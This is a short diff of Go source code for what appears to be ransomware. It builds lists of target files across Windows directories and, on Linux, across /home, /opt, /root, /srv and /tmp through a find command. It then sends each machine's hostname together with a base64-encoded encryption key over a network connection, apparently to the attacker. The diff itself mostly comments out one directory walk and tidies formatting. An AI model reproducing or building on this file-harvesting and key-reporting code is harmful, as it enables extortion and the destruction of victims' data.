@@ -89,11 +89,11 @@ func main() {
 			listfile = append(listfile, path)
 			return nil
 		})
-		root = "C:\\Program Files"
-		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
-			listfile = append(listfile, path)
-			return nil
-		})
+		//root = "C:\\Program Files"
+		//_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
+		//	listfile = append(listfile, path)
+		//	return nil
+		//})
 	case "linux":
 		cmd := exec.Command("bash", "-c", "find /home /opt /root /srv /tmp -type f -size -200M ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null")
 		output, _ := cmd.CombinedOutput()
@@ -129,12 +129,12 @@ func main() {
 		case "windows":
 			name := ""
 			output, _ := exec.Command("wmic", "computersystem", "get", "name").Output()
-			for _,letter := range string(output)[4:] {
-				if letter != 32 && letter != 13 && letter != 10{
+			for _, letter := range string(output)[4:] {
+				if letter != 32 && letter != 13 && letter != 10 {
 					name += string(letter)
 				}
 			}
-			fmt.Fprintf(c, name + "|" + base64.StdEncoding.EncodeToString(CryptKey))
+			fmt.Fprintf(c, name+"|"+base64.StdEncoding.EncodeToString(CryptKey))
 		case "linux":
 			cmd := exec.Command("cat", "/etc/hostname")
 			output, _ := cmd.CombinedOutput()
